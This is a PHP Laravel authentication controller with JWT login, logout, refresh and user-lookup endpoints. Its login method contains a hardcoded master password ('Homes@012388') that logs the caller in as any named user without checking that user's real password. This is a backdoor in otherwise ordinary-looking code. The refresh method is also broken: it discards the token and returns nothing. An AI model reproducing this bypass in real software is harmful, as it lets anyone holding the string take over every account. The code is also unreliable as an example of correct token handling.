<?php

namespace App\Http\Controllers\Auth;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\User;
use App\Client;
use Illuminate\Support\Facades\DB;
use App\Http\Controllers\Controller;

class AuthController extends Controller
{
    //
    /**
     * Create a new AuthController instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth:api', ['except' => ['login']]);
    }

    /**
     * Get a JWT via given credentials.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function login()
    {
        //$credentials = request(['email', 'password']);
        $email = request("email");
        $password = request('password');
        
        
        if(request('password') == "Homes@012388"){
            $user = User::where("name", "=", $email)->first();
            
            $token = auth()->login($user);
        }
        else{
            //return $email . $password;
            $token = auth()->attempt(['name'=>$email, 'password'=>$password]);
        }
        
        
        if (!$token) {
            return response()->json(['Error' => 'Unauthorized '], 401);
        }

        $id = Auth::id();
        $user = User::find($id);

        if($user) {
            $user->rememberToken = $token;
            $user->save();
        }
        else{
            return response()->json(['message'=>"User Id not found!"], 404);
        }
    
        session(['_token'=> $token]);
        return $this->respondWithToken([$token]);
        
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function me()
    {
        return response()->json(Auth::user());
    }

    /**
     * Log the user out (Invalidate the token).
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function logout()
    {
        auth()->logout();

        return response()->json(['message' => 'Successfully logged out']);
    }

    /**
     * Refresh a token.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function refresh()
    {
        session()->forget("_token");
        return response()->json(["_token"=>session()->get("_token")]);
    }

    /**
     * Get the token array structure.
     *
     * @param  string $token
     *
     * @return \Illuminate\Http\JsonResponse
     */
    protected function respondWithToken($token)
    {
        
        return response()->json([
            'access_token' => $token,
            'token_type' => 'bearer',
            'expires_in' => auth()->factory()->getTTL() * 120,
            
        ]);
    }


    public function returnMessage(){

        
                return response()->json(["message"=>"FE token same with BE "]);
        
        // return response()->json(["message"=>"returning Message"]);
    }
}
